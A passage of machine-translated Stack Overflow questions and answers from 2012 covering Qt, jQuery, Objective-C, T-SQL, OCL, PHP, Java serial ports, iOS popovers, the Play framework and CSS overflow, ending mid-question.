> 
> 时间：2012-05-04T09:28:58.793
> 
> 标签：c++, qt

因此，`select(SelectionType)`类中的方法`QTextCursor`只有 4 个可能的参数。

```
QTextCursor::Document
QTextCursor::BlockUnderCursor
QTextCursor::LineUnderCursor
QTextCursor::WordUnderCursor 
```

是否可以创建自定义选择类型？说如果我想从位置 5 到 9 选择文本。谢谢！

[http://doc.qt.io/qt-5/qtextcursor.html#select](http://doc.qt.io/qt-5/qtextcursor.html#select)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:36:37.963

像这样使用[`setPosition`](http://doc.qt.io/qt-5/qtextcursor.html#setPosition)：

```
cursor.setPosition(5);
cursor.setPosition(9, QTextCursor::KeepAnchor); 
```

这会将光标的 Anchor 设置为 5，将其 Position 设置为 9。选择是锚点和位置之间的文本。

# jquery - 通过外部链接进入时直接打开colorbox

> ID：10446216
> 
> 赞同：-1
> 
> 时间：2012-05-04T09:29:12.347
> 
> 标签：jquery, colorbox

亲爱的stackoverflowers，

我有一个网站，您可以在其中使用 iframe = true 在颜色框中打开页面（带 id）。在这个 iframe（颜色框打开）中，您可以点击 facebook like 按钮。在 facebook like 按钮的元数据中，您可以设置一个 url，当单击您的 facebook 上的文章时将打开该 url。

我想要的是以下内容：当有人点击 facebook 上的文章时，您将被引导回到 FB like 按钮的元数据中设置的 url。现在，它会打开 url，但不是在颜色框中。我希望这个 url 自动打开一个颜色框。

那么从外部链接输入时是否可以直接打开颜色框？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T15:49:05.717

当然。您需要向 URL 添加某种信息，以便您可以判断它是否应该在颜色框中打开（查询字符串或片段）。然后，您将在页面中添加一些脚本来解析该 url 以检查它是否应该在颜色框中打开。如果是这样，您将使用 colorbox 的 open 属性和 href 属性自动打开正确的链接。

[常见问题解答](http://www.jacklmoore.com/colorbox/faq#faq-querystring)中简要介绍了它

# objective-c - I want a code that will be called everytime an app is launched, activated, or reactivated

> ID：10446221
> 
> 赞同：0
> 
> 时间：2012-05-04T09:29:37.903
> 
> 标签：objective-c, xcode4

```
- (void)applicationWillBecomeActive:(NSNotification *)notification
{
    NSRunAlertPanel(@"Wee I am called", @"Hello", @"OK", @"Alternate Button", @"OtherButton");

    [showdesktop showDeskHideMe];
} 
```

The problem with code above is it's only launched when the app is first launched.

If after that I open up other apps, and then click the apps again from the dock, the code will not be launched.

How do I do that?

How to "deactivate" an application anyway?

Note: This is about MacOs, not IOS!!!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:33:39.443

Try the following methods:

```
- (void)applicationWillResignActive:(UIApplication *)application
{}

- (void)applicationDidEnterBackground:(UIApplication *)application
{}

- (void)applicationWillEnterForeground:(UIApplication *)application
{} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:37:01.257

Have a look at the "Notifications" section here: [https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/nsapplication_Class/Reference/Reference.htm](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/nsapplication_Class/Reference/Reference.htm) ( Sorry, can't find a direct link )

There are a bunch of notifications which you can catch ranging a wide array of different events. For example, `NSApplicationDidUnhideNotification` seems interesting in your case. You can use the `NSNotificationCenter` to pick up on these notifications. For more information about the NSNotificationCenter check: [https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Notifications/Introduction/introNotifications.html#//apple_ref/doc/uid/10000043i](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Notifications/Introduction/introNotifications.html#//apple_ref/doc/uid/10000043i)

# sql-server-2008 - T-SQL：查找今天之前最后一次出现的聚合状态

> ID：10446225
> 
> 赞同：3
> 
> 时间：2012-05-04T09:29:45.457
> 
> 标签：sql-server-2008

我有一张包含库存交易的表格。一个简化的例子：

```
--Inventory Transactions            
Date         Sold    Purchased  Balance(not in table)
Today        1                  -5
Yesterday    6                  -4
5 days ago           5          +2
10 days ago  103                -3 
20 days ago          100        +100 
```

要求表明报告应包含自文章出现负余额（缺货）以来的日期。在上面的例子中，它意味着**昨天**作为答案。

我正在尝试将其转换为 SQL，但遇到了一些麻烦。我尝试过使用 CTE：

```
with Stockouts as (
select getdate() as [Date],
       (calculation) as Balance
from [Inventory Transactions]
--some constraints to get the correct article are omitted
union all
select dateadd(dd, -1, Stockouts.[Date]) as [Date], 
       Stockouts.Balance - (calculation) as Balance
from [Inventory Transactions]
inner join Stockouts    
) 
```

但是有一个问题是我不能在递归部分使用子查询（查找当前事务之前的最后一个事务），并且当某个日期没有事务时，内部连接将停止循环（因此该`dateadd`部分也会失败） ）。

解决此问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:47:52.743

我认为最好的方法是这样使用`OUTER APPLY`：

```
DECLARE @InventoryTransactions TABLE ([Date] DATE, Sold INT, Purchased INT)
INSERT @InventoryTransactions VALUES 
    ('20120504', 1, 0),
    ('20120503', 6, 0),
    ('20120501', 0, 5),
    ('20120425', 103, 0),
    ('20120415', 0, 100)

SELECT  trans.Date, 
        trans.Sold, 
        trans.Purchased, 
        ISNULL(Balance, 0) [BalanceIn],
        ISNULL(Balance, 0) + (Purchased - Sold) [BalanceOut]
FROM    @InventoryTransactions trans
        OUTER APPLY
        (   SELECT  SUM(Purchased - Sold) [Balance]
            FROM    @InventoryTransactions bal
            WHERE   Bal.Date < trans.Date
        ) bal 
```

您的方法不太适合递归。如果您需要所有日期，那么最好创建一个日期表并将`LEFT JOIN`上面的结果创建到包含所有日期的表中。最好有一个永久的日期表（例如 dbo.Calendar），因为它们可以在多种情况下使用，但您始终可以使用循环、CTE 或系统视图来创建临时表来操作它。关于如何[生成递增日期列表的](https://stackoverflow.com/questions/1478951/tsql-generate-a-resultset-of-incrementing-dates)问题之前已经回答过

**编辑**

只需重新阅读您的要求，我认为这是获得您真正想要的东西的更好方法（使用相同的示例数据）。

```
;WITH Transactions AS
(   SELECT  trans.Date, 
            trans.Sold, 
            trans.Purchased, 
            ISNULL(Balance, 0) [BalanceIn],
            ISNULL(Balance, 0) + (Purchased - Sold) [BalanceOut]
    FROM    @InventoryTransactions trans
            OUTER APPLY
            (   SELECT  SUM(Purchased - Sold) [Balance]
                FROM    @InventoryTransactions bal
                WHERE   Bal.Date < trans.Date
            ) bal
) 
SELECT  DATEDIFF(DAY, MAX(Date), CURRENT_TIMESTAMP) [Days Since Negative Balance]
FROM    Transactions
WHERE   BalanceIn > 0 
```

**编辑 2**

我创建了一个[SQL Fiddle](http://sqlfiddle.com/#!3/7dc8e/3)来演示查询计划`OUTER APPLY`和递归之间的区别。您可以看到 CTE 的工作量更大，并且当在我的本地计算机上运行相同的数据时，它告诉我，当在同一批次中运行这两个时，外部应用方法的相对批次成本为 17%，不到四分之一递归 CTE 方法占 83%。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:53:07.683

如果您想在递归 cte 中执行此操作。这可能是一个建议：

**测试数据：**

```
DECLARE @T TABLE(Date DATETIME,Sold INT, Purchased INT)

INSERT INTO @T
VALUES
    (GETDATE(),1,NULL),
    (GETDATE()-1,6,NULL),
    (GETDATE()-5,NULL,5),
    (GETDATE()-10,103,NULL),
    (GETDATE()-20,NULL,100) 
```

**询问**

```
;WITH CTE
AS
(
    SELECT ROW_NUMBER() OVER(ORDER BY Date ASC) AS RowNbr, t.* FROM @T AS T
)
, CTE2
AS
(
    SELECT
        CTE.RowNbr,
        CTE.Date,
        CTE.Sold,
        CTE.Purchased,
        (ISNULL(CTE.Purchased,0)-ISNULL(CTE.Sold,0)) AS Balance
    FROM
        CTE
    WHERE
         CTE.RowNbr=1
    UNION ALL
    SELECT
        CTE.RowNbr,
        CTE.Date,
        CTE.Sold,
        CTE.Purchased,
        CTE2.Balance+ISNULL(CTE.Purchased,0)-ISNULL(CTE.Sold,0) AS Balance
    FROM
        CTE
        JOIN CTE2
            ON CTE.RowNbr=CTE2.RowNbr+1
)
SELECT * FROM CTE2 ORDER BY CTE2.RowNbr DESC 
```

**输出**

```
5   2012-05-04 11:49:45.497 1       NULL    -5
4   2012-05-03 11:49:45.497 6       NULL    -4
3   2012-04-29 11:49:45.497 NULL    5        2
2   2012-04-24 11:49:45.497 103     NULL    -3
1   2012-04-14 11:49:45.497 NULL    100     100 
```

# eclipse - OclInEcore：操作返回类型问题

> ID：10446228
> 
> 赞同：0
> 
> 时间：2012-05-04T09:29:52.643
> 
> 标签：eclipse, constraints, eclipse-emf-ecore, ocl

我想在“Comp”类的上下文中在 oclInEcore 编辑器中编写以下操作，该类应该将 Comp 对象的父对象收集到 Set。

```
operation parents(): Set(Comp)
    {
        body: self.superComp->union(self.parents());
    } 
```

问题是， ocl 不接受 Set(Comp) 作为返回类型。但是，它接受 Comp[*]，但这最终会导致无效调用（由于返回类型不兼容，我想......）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T12:14:50.157

`Set(Comp)`确实无效。在 OCLInEcore 中，指定返回类型的语法是不同的。问题是模型结构定义（类、特性、操作）与 OCL 本身无关。只有在您为不变量、派生特征或操作体定义实际逻辑时，它才会出现。

这样做的正确方法如下：

```
operation parents() : Comp[*] { <properties> derived } 
```

是`Comp`返回类型，`[*]`设置`upperBound`为 -1。这`<properties>`是一个操作返回类型属性的列表，它将精确地指定应该使用哪个集合类。

以下是选项：

*   `!unique ordered`-->`Sequence(Comp)`
*   `!unique !ordered`-->`Bag(Comp)`
*   `unique !ordered`-->`Set(Comp)`
*   `unique ordered`-->`OrderedSet(Comp)`

例如：

```
operation parents() : Comp[*] { unique !ordered derived } 
```

将导致`Set(Comp)`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:25:01.920

我不知道 oclInEcore，但在基本 ecore 中，您可以定义一个 EDataType 并将其“实例类型名称”设置为您想要的 Java 返回类型，然后在您的 EOperation 上使用该数据类型。HTH。

# php - 为什么 PHP APC 缓存丢失一直在增加

> ID：10446229
> 
> 赞同：2
> 
> 时间：2012-05-04T09:29:52.937
> 
> 标签：php, apc, php4, opcode-cache

我正在使用 apc.php 检查 PHP APC 的统计信息 (http://svn.php.net/viewvc/pecl/apc/trunk/apc.php)

我在相当繁忙的服务器上有以下统计信息

```
Cached Files    317 ( 26.3 MBytes)
Hits    51483
Misses  6814 
```

问题是**Misses**总是在增加（鉴于文件数量有限），有没有办法检查哪些文件丢失了？

另一个问题是：缓存文件总共消耗 26.3MBytes，这是否意味着每个 Apache 子进程都使用 26.3MBytes？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T09:34:06.033

你知道apc是做什么的，不是吗？

您会期望在缓存情况下未命中率会上升吗？如果你有过时的缓存，或者只是冷缓存，你会错过，缓存被填满，下一次（直到它过期）你会得到一个命中。

总缓存量（26.3 mb）是缓存中的文件数量。这与 apache 子级无关，这是为快速访问而保存的信息量。

# windows-phone-7 - WP7 如何减少 TextBlock 中的字母间距

> ID：10446235
> 
> 赞同：3
> 
> 时间：2012-05-04T09:30:16.030
> 
> 标签：windows-phone-7, kerning

是否可以减少文本块中字符之间的字母间距？

谢谢

托马斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:35:25.060

Windows Phone 似乎不支持字距调整：-

[http://social.msdn.microsoft.com/Forums/en/windowsphone7series/thread/5bd5c3c2-b9a0-4adf-a760-dab17abad157](http://social.msdn.microsoft.com/Forums/en/windowsphone7series/thread/5bd5c3c2-b9a0-4adf-a760-dab17abad157)

自定义解决方案可能如下：-

[http://blogs.msdn.com/b/danteg/archive/2009/02/27/a-silverlight-textblock-with-tracking-surely-you-jest.aspx](http://blogs.msdn.com/b/danteg/archive/2009/02/27/a-silverlight-textblock-with-tracking-surely-you-jest.aspx)

# javascript - 是否有一个不错的 Javascript 仅算术加法运算符？

> ID：10446242
> 
> 赞同：1
> 
> 时间：2012-05-04T09:30:42.553
> 
> 标签：javascript, operators, operator-overloading, add

我的意思是不是字符串+数字=字符串或字符串+字符串=字符串的默认javascript行为。从[http://www.javascriptkit.com/jsref/arithmetic_operators.shtml](http://www.javascriptkit.com/jsref/arithmetic_operators.shtml)，一元加号将字符串转换为数字。

那么我如何指定我想要两个字符串的数字加法呢？这似乎有效，但有点难看：

```
var a = "5";
var b = "2";
var c = +a + +b; 
```

是否存在（仅数字 +）运算符，它总是返回一个数字？可以像其他语言一样定义一个吗？例如，可能是 '%%' 或 '+^' 或 '+++'？或者这是不可能的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:32:15.343

不可以。如果要执行数字加法，则必须在开始之前确保表达式的两边都是数字。

# cocos2d-iphone - 如何在cocos2d中获取一段时间内贝塞尔曲线上的点坐标？

> ID：10446257
> 
> 赞同：0
> 
> 时间：2012-05-04T09:31:35.407
> 
> 标签：cocos2d-iphone, bezier

我有一个沿着贝塞尔曲线移动的精灵。运动的全部时间让我们说是 5 秒。我想知道的是如何在 1.5 或 2.347 秒的移动后获得我的精灵的位置。有没有标准的 cocos2d 函数来计算这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:32:58.287

我不认为有具体的方法..只需在特定时间后调用一个方法并计算位置......我认为你不能干扰两者之间的贝塞尔动作并计算位置..希望这会有所帮助:)

# iphone - （iphone的Phonegap）在网络导航器中打开外部链接

> ID：10446258
> 
> 赞同：1
> 
> 时间：2012-05-04T09:31:41.643
> 
> 标签：iphone, cordova, hyperlink, external

这个问题很简单：

如何使用Phonegap（版本1.4.0）制作的iPhone应用程序打开外部链接（如“_blank”）？？？

我测试了很多在互联网上找到的解决方案，但没有好的结果......

我可以在应用程序的同一窗口中打开链接，但我有兴趣在 iPhone 的网络导航器中打开（safari？）

请帮我！太感谢了！

（所有链接都有“rel='external'”和“target='_blank'”）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:35:24.450

尝试这个，

在 Phonegap.plist 文件中，在 ExternalHosts 中添加 *

然后外部链接将打开，希望，这会很有用

# php - 在每个现有数组元素之间添加数组元素

> ID：10446259
> 
> 赞同：-1
> 
> 时间：2012-05-04T09:31:47.297
> 
> 标签：php, mysql, arrays, phpexcel

我正在尝试通过从 MySql 获取数据在 Excel 中创建报告。我需要从数据库中获取主题标题并将它们作为列输出到 Excel 工作表，例如单元格：D5、E5、F5 ... M5 等。

到目前为止，我已经设法做到了，因此单元格下的显示包含如下标题：

D5：数学，E5：英语，F5：物理等。

```
 | A | B | C | D           | E       | F       | G   | H   |
--------------------------------------------------------------
1 |   |   |   |             |         |         |     |     |
...
5 |   |   |   | Mathematics | English | Physics | ... | ... | 
```

这很好。挑战是，我需要在每个s`GRADE`之间插入一个标题，如下所示：`Subject`

```
 | A | B | C | D           | E     | F       | G     | H       | I     | J   | K   |
--------------------------------------------------------------------------------------
1 |   |   |   |             |       |         |       |         |       |     |     |
...
5 |   |   |   | Mathematics | GRADE | English | GRADE | Physics | GRADE | ... | ... | 
```

现在这是我到目前为止所拥有的：

```
$stringindex = "DEFGHIJKLMNOPQRSTUVWXYZ"; // For the excel column cells
$arr_index = str_split($stringindex); // create array elements
$arr_val2 = array(); // create array
$subject = array();
$subname2 = array();

while($sub_row = mysqli_fetch_array($resub, MYSQLI_ASSOC)) {
    $subject[] = $sub_row['name']; // Get the subjects from the database and put them in an array
}

foreach($subject as $sub => $subname) {
    $subkey[] = $sub; // array of subject keys e.g 0|1|2|3
    $subname2[] = $subname; // array of subjects
}

foreach($arr_index as $arr => $arr_val) {
    $arr_val2[] = $arr_val; // array of letters e.g D|E|F|G
}

$acount = count($subname2);
$bcount = count($arr_val2);

$size = ($acount > $bcount) ? $bcount : $acount;
$a = array_slice($subname2, 0, $size);
$b = array_slice($arr_val2, 0, $size);

$combine = array_combine($a, $b);

$sheet = $objPHPExcel->setActiveSheetIndex(0); // PHPExcel functions

foreach($combine as $key => $val) { // GET SUBJECTS
     $objPHPExcel->getActiveSheet()->getColumnDimension($val)->setAutoSize(true); // Sets Column Width

     $sheet
        ->setCellValue($val.'5', $key); // Lists Subjects as columns

} // END of FOREACH LOOP 
```

上面的代码能够在 excel 中将主题显示为列标题：

问题：如何添加代码以在每个主题词之后添加 GRADE 列？

我希望你能指出我正确的方向，因为我现在卡住了。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:07:47.460

$临时=真；

然后在通过列的循环中：

```
if($temp==true){
    //do stuff
    $temp=false;
}else{
    //do other stuff
    $temp=true;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:25:15.393

你可以尝试这样的事情：

```
$stringindex = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";    // For the excel column cells
$columns = str_split($stringindex);             // create array elements
$rowIndex = 5;      // start at row 5 in Excel
$columnIndex = 3;   // start at column D in Excel
$subjects = array();

while($sub_row = mysqli_fetch_array($resub, MYSQLI_ASSOC)) {
    $subject[] = $sub_row['name']; // Get the subjects from the database and put them in an array
}

$sheet = $objPHPExcel->setActiveSheetIndex(0); // PHPExcel functions
foreach($subject as $index => $subjectName) { // GET SUBJECTS
    $columnName = getColumnName($columnIndex, $columns);
    $objPHPExcel->getActiveSheet()->getColumnDimension($columnName)->setAutoSize(true); // Sets Column Width
    $sheet->setCellValue($columnName.$rowIndex, $subjectName); // Lists Subjects as columns
    $columnIndex++;

    $columnName = getColumnName($columnIndex, $columns);
    $objPHPExcel->getActiveSheet()->getColumnDimension($columnName)->setAutoSize(true); // Sets Column Width
    $sheet->setCellValue($columnName.$rowIndex, "GRADE"); 
    $columnIndex++;
} // END of FOREACH LOOP

function getColumnName($index, $columns) {
    $columnName = "";
    $numColumns = count($columns);
    while($index >= $numColumns) {
        $columnName = $columns[($index % $numColumns)] . $columnName;
        $index = floor($index / $numColumns) - 1;
    }
    $columnName = $columns[($index % $numColumns)] . $columnName;
    return $columnName;
} 
```

我添加了一个函数*getColumnName()*如果您的主题和等级列超过 AZ 限制，它会为您提供“AA”、“AB”、...。

# jquery-ui - TokenInput 加 jQuery UI Dialog 冲突

> ID：10446262
> 
> 赞同：3
> 
> 时间：2012-05-04T09:32:00.043
> 
> 标签：jquery-ui, autocomplete

**更新**在使用 edge jQuery 的最新 Fx/Chrome 中，这似乎不再是问题

* * *

**问题**：自动完成将在对话框后面，如果您移动它，对话框将移出页面。

**调查**

我已经检查过了

[为什么 jquery ui 对话框会破坏我的 jquery.tokeninput.js 自动完成功能？](https://stackoverflow.com/questions/6669654/why-does-jquery-ui-dialog-mangle-my-jquery-tokeninput-js-autocomplete)

并阅读 github 请求

*   问题 93[在 jQuery-ui 模态对话框](https://github.com/loopj/jquery-tokeninput/issues/93)和
*   issue 94[下拉定位问题](https://github.com/loopj/jquery-tokeninput/pull/94)

但我仍然对我认为是最新的东西（来自github [jQuery TokenInput](https://github.com/loopj/jquery-tokeninput)的TokenInput JS 和CSS ）有同样的问题。

* * *

**演示和代码**

*   [DEMO1](http://plungjan.name/test/filter_no_ui.html) : 注释掉 jQuery UI 时 TokenInput 如何工作
*   [DEMO2](http://plungjan.name/test/filter.html)：我想要的工作

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1/jquery-ui.min.js"></script>     
<link rel="stylesheet"        href="http://ajax.googleapis.com/ajax/libs/jqueryui/1/themes/base/jquery-ui.css" type="text/css" />
<script type="text/javascript" src="jquery.tokeninput.js"></script>
<link rel="stylesheet" href="token-input-facebook.css" type="text/css" />

<button id="filterBut">FILTER</button>

<div id="dialog-form" title="Filter" style="border:1px solid black">
    <p class="validateTips">Enter text contained in the respective fields</p>

    <form>
    <fieldset>
        <label for="name">Field1</label><br/><input type="text" name="Flt1" id="Flt1" class="text ui-widget-content ui-corner-all" style="width:300px"/><br/><br/>
        <label for="email">Field2</label><br/><input type="text" name="Flt2" id="Flt2" value="" class="text ui-widget-content ui-corner-all" style="width:300px" />
    </fieldset>
    </form>
</div>
<script>
$(function() {  
   $("#Flt1, #Flt2").tokenInput([
      {id: 7, name: "Ruby"},
      {id: 11, name: "Python"},
      {id: 13, name: "JavaScript"},
      {id: 17, name: "ActionScript"},
      {id: 19, name: "Scheme"},
      {id: 23, name: "Lisp"},
      {id: 29, name: "C#"},
      {id: 31, name: "Fortran"},
      {id: 37, name: "Visual Basic"},
      {id: 41, name: "C"},
      {id: 43, name: "C++"},
      {id: 47, name: "Java"}
    ],{theme:"facebook"});

  $( "#dialog-form" ).dialog({
            autoOpen: false,
            height: 400,
            width: 460,
            modal: true
  });                        
  $( "#filterBut" ).click(function() {

  // suggestion from 
  // https://stackoverflow.com/questions/6669654/why-does-jquery-ui-dialog-mangle-my-jquery-tokeninput-js-autocomplete
    $("#dialog-form script").remove();
  // does not seem to change anything

    $( "#dialog-form" ).dialog( "open" );
  });

});
</script>         
              </div>     
            </div>
          </form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-12T06:17:47.107

更改 div.token-input-dropdown 的样式 en css 并将 z-index:1 替换为 z-index:1005。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-15T08:20:14.693

这是这个库的一个已知问题（[github](https://github.com/loopj/jquery-tokeninput)上的 issue #94 ）。[您可以从此处](https://github.com/loopj/jquery-tokeninput/pull/94/files)收集已修补的文件以解决问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-15T23:47:33.650

我对您的 HTML 进行了一些处理，似乎设置 zindex:1005 会在对话框中显示下拉菜单。

```
],{theme:"facebook", zindex:1005}); 
```

但是，如果您移动对话框，自动完成下拉菜单会停留在之前的位置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-03T13:01:50.133

这个jQuery代码为我解决了隐藏问题（感谢@user2192014和[这个想法的答案](https://stackoverflow.com/a/11613362/304209)）：

```
$(".token-input-dropdown-facebook, .token-input-list-facebook").css("z-index","9999"); 
```

# java - 64 位系统上 Java 的串行通信 API（调制解调器交互）

> ID：10446265
> 
> 赞同：6
> 
> 时间：2012-05-04T09:32:08.523
> 
> 标签：java, serial-port, 32bit-64bit, modem, rxtx

我正在寻找 Java 的串行通信 API。非常重要的是对64位系统的支持。我已经将 rxtx 与 Cloudhopper 的 64 位库一起使用，[但](http://www.cloudhopper.com/opensource/rxtx/)在某些 Windows Server 2008 系统上，我在访问（虚拟）串行端口时遇到了 jvm 崩溃的严重问题。

主要目的是与模拟调制解调器进行交互，也许Java中有另一种调制解调器通信方式？

如果 API 是免费的，那就太好了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T11:11:42.497

我已经转移到新的[java-simple-serial-connector](http://code.google.com/p/java-simple-serial-connector/)，它在当前版本 0.9.0 中似乎非常稳定和舒适。现在它适用于每个系统（我需要）并且虚拟串行端口没有问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:45:36.130

您可以尝试[Java Communications API](http://www.oracle.com/technetwork/java/index-jsp-141752.html)。

您可以使用此[链接](http://circuitnegma.wordpress.com/2007/02/07/how-to-install-the-java-communications-api-in-a-windows-environment/)中的帮助对其进行配置。

**编辑**：

从[这里](http://rickproctor.wordpress.com/2006/06/07/javaxcomm-jar-for-windows-mia/)下载。

# iphone - 如何从另一个视图控制器中关闭弹出控制器

> ID：10446272
> 
> 赞同：1
> 
> 时间：2012-05-04T09:32:24.113
> 
> 标签：iphone, ios, uinavigationcontroller, uipopovercontroller

我在主菜单中有一个 barbutton ..点击该按钮将显示一个 popoveontroller,,,称为 bookselectionview,,,它由 tableview 组成,当我点击 cel 它导航到弹出框内的另一个视图控制器,,seondview 包括按钮，当我点击任何按钮时，它导航到弹出控制器内的第三个视图控制器......一切正常......但我的问题是，当我点击第三视图中的任何按钮时，我想关闭这个 popoverontroller......并且必须导航到主视图..现在它显示了popoverontrollerr中的主视图..我尝试了很多东西，但没有任何帮助......我的代码是......

在主视图的栏按钮中，我输入了这段代码

```
 BookSelectionview* popoverContent = [[BookSelectionview alloc]
                                         init];    
    UINavigationController *navigationController = [[[UINavigationController alloc] initWithRootViewController:popoverContent] autorelease];

    popoverContent.contentSizeForViewInPopover =
    CGSizeMake(500, 800);

    self.popup = [[UIPopoverController alloc]
                              initWithContentViewController:navigationController];

    [self.popup presentPopoverFromRect:CGRectMake(348, 0, 0, 0)
                                            inView:self.view
                          permittedArrowDirections:UIPopoverArrowDirectionAny
                                          animated:YES]; 
```

然后在我的bookselectionview控制器中，我把这个颂歌放在我的tableview中确实选择了方法

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

 ChapterSelectionView *detailViewController = [[ChapterSelectionView alloc] initWithNibName:@"ChapterSelectionView" bundle:nil];
    detailViewController.contentSizeForViewInPopover =
    CGSizeMake(500, 600);

    //detailViewController.firstString = firstString;
    // ...
    // Pass the selected object to the new view controller.
    detailViewController.selectedIndex=indexPath.row;
    appDelegate.selectedBookIndex=indexPath.row;
    self.hidesBottomBarWhenPushed=YES;
    [self.navigationController pushViewController:detailViewController animated:YES];

    [detailViewController release];

} 
```

在我的seconview（chapterselectionview）中，我将此codee放在按钮cilk中

```
-(void)ButtonClicked:(UIButton *)sender{
    [NSThread detachNewThreadSelector: @selector(spinBeginchapterselection) toTarget:self withObject:nil];

        VersusSelectionView *detailViewController = [[VersusSelectionView alloc] initWithNibName:@"VersusSelectionView" bundle:nil];
    detailViewController.contentSizeForViewInPopover =
    CGSizeMake(500,600);

    detailViewController.selectedChapter=[sender.titleLabel.text intValue];
    appDelegate.selectedChapterIndex=[sender.titleLabel.text intValue];
    self.hidesBottomBarWhenPushed=YES;
    [self.navigationController pushViewController:detailViewController animated:YES];

    [detailViweController relese]; 
```

然后在我的第三个视图中，即 verseviewcontroller 我把这段代码导航到主视图（parallelReaviewcontroller）这里我需要关闭弹出窗口......

```
-(void)ButtonClicked:(UIButton *)sender{
    [self dismissModalViewControllerAnimated:YES];
    [NSThread detachNewThreadSelector: @selector(spinBeginverseselection) toTarget:self withObject:nil];

    appDelegate.selectedBook = [appDelegate.books objectAtIndex:appDelegate.selectedBookIndex];
    appDelegate.selectedChapter = [NSString stringWithFormat:@"%d",appDelegate.selectedChapterIndex];
    appDelegate.selectedVerse = [NSString stringWithFormat:@"%d",[sender.titleLabel.text intValue]];
    [appDelegate reloadVerses];

        ParallelReadViewController *detailViewController = [[ParallelReadViewController alloc] initWithNibName:@"ParallelReadViewController" bundle:nil];

    [self.navigationController pushViewController:detailViewController animated:YES];

    [detailViewController release];
 please help me to solve this problem,,,thanks in advance. 
```

# playframework - play framework 1.2.4 泄露 https 连接

> ID：10446283
> 
> 赞同：0
> 
> 时间：2012-05-04T09:33:17.623
> 
> 标签：playframework, playframework-1.x

我有一个处理 http 和 https 请求的播放框架 1.2.4 站点。

Play 监听 80 和 443 端口，没有安装反向代理。

一段时间后，站点停止响应，并在日志中显示大量“java.io.IOException：打开的文件过多”。

显然，播放有时会使 https 连接处于 CLOSE_WAIT 状态。这些连接如下所示：

```
java    24151 root  201u  IPv6             915797      0t0      TCP Ubuntu-1004-lucid-64-minimal:https->xdsl.******.net:55055 (CLOSE_WAIT) 
```

以下是对存活（工作几个小时）和死亡（打开 16k 文件）的 lsof 转储的分析：

```
$ grep "CLOSE_WAIT" dead.txt | wc -l
10473
$ grep "ESTABLISHED" dead.txt | wc -l
1888
$ grep "https.*CLOSE_WAIT" dead.txt | wc -l
10473
$ grep "https.*ESTABLISHED" dead.txt | wc -l
1621

$ grep "CLOSE_WAIT" alive.txt | wc -l
7
$ grep "ESTABLISHED" alive.txt | wc -l
50
$ grep "https.*CLOSE_WAIT" alive.txt | wc -l
7
$ grep "https.*ESTABLISHED" alive.txt | wc -l
32 
```

如您所见，约 20% 的请求是 http，但所有处于 CLOSE_WAIT 状态的连接都是 https。

什么可能造成麻烦？这可能是游戏框架中的错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:12:10.173

根据您所描述的，我同意这似乎是 Play 中的一个错误。这可能是 Netty 的问题，但由于 Play 与 Netty 集成，我认为分界与您的目的无关。我建议在 Lighthouse 上提出一张票，并可能联系 Nicolas Leroux，他负责应用程序的 https 部分。

但是，Play 开发人员会首先说 Play 不打算成为 http 和 https 容器。https 握手最好由前端代理执行，例如 Apache。在线和 Play 文档中有很多关于如何执行此操作的示例。

# jrebel - JRebel 可以使用这个项目设置吗？

> ID：10446284
> 
> 赞同：0
> 
> 时间：2012-05-04T09:33:24.970
> 
> 标签：jrebel

我们有一个项目，我们使用 Maven 在 mvn clean install 上部署到 Tomcat。我对 Java 开发相当陌生，并且发现很难持续等待安装完成以查看更改。我使用 IntelliJ，我认为类文件仅在 mvn install 期间在目标目录中创建。

是否可以使用 JRebel，所以当我在 IntelliJ 中保存文件时，编译的类会立即更新 Tomcat，就像它们在 JRebel 视频中显示的那样？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T11:56:50.193

IntelliJ 会自动为您保存文件。您需要做的就是重新编译更改的类，这些将被 JRebel 拾取，假设您已将 rebel.xml 配置文件包含到部署的存档中。

# css - 悬停的元素从溢出中溢出：隐藏元素 css

> ID：10446287
> 
> 赞同：15
> 
> 时间：2012-05-04T09:33:33.270
> 
> 标签：css

我做了一个小提琴供参考：http: [//jsfiddle.net/kLFn9/](http://jsfiddle.net/kLFn9/)

`overflow:hidden`问题突出显示。

基本上，我`:hover:after`用来显示工具提示。但父元素有`overflow: hidden`它。如何强制悬停的元素转义父元素？

相关CSS：

```
div {
    width:500px;
    height:200px;
    background:red;   
    margin: 50px;
    overflow: hidden; /* this rule */
}

span:hover:after {
